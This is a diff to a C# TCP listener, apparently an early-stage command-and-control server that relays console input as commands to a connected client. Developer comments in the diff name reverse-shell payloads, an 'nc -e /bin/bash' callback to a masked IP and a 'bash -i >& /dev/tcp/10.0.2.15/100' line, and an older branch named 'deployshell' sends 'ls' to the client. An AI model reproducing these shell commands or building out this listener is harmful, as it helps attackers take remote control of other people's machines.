@@ -119,17 +119,32 @@ namespace tcp_listener
                         
                         while (client.Connected)
                         {
-                            //Byte[] newbytes = new Byte[256];
-                            //streamWriter = new StreamWriter(stream);
+                            //MAKING PROGRESS - need to put it in a loop so it doesn't just process one command
+                            //use above example for help
+                            //ALSO new payload needs to be - nc -e /bin/bash 192.XXX.X.X 13000
+                            //https://docs.microsoft.com/en-us/dotnet/api/system.io.streamwriter.-ctor?view=net-5.0#System_IO_StreamWriter__ctor_System_IO_Stream_
 
-                            string text = Console.ReadLine();
-                            if (text == "deployshell")
+                            Byte[] newbytes = new Byte[256];
+                            streamWriter = new StreamWriter(stream);
+                            StringBuilder userinput = new StringBuilder();
+                            StreamReader rdr = new StreamReader(stream);
+
+                            using (rdr)
                             {
-                                //string payload = "bash -i >& /dev/tcp/10.0.2.15/100 0>&1";
-                                string te = "ls";
+                                string text = Console.ReadLine();
+                                streamWriter.WriteLine(text);
+                                streamWriter.Flush();
+
+                            }
+
+                            //string text = Console.ReadLine();
+                            /*if (text == "deployshell")
+                            {
+                                //bash??? = "bash -i >& /dev/tcp/10.0.2.15/100 0>&1";
+                                string te = "ls\n";
                                 byte[] msg = System.Text.Encoding.ASCII.GetBytes(te);
                                 stream.Write(msg, 0, msg.Length);
-                            }
+                            }*/
                         }
 
                         /*while ((i = stream.Read(bytes, 0, bytes.Length)) != 0)
@@ -145,12 +160,14 @@ namespace tcp_listener
 
                             //data = Console.ReadLine();
 
-                            //stream.Read(msg, 0, msg.Length);
+                            stream.Read(msg, 0, msg.Length);
 
                             // Send back a response.
                             stream.Write(msg, 0, msg.Length);
                             Console.WriteLine("Sent: {0}", data);
                         }*/
+
+                        
 
                         // Shutdown and end connection
                         client.Close();
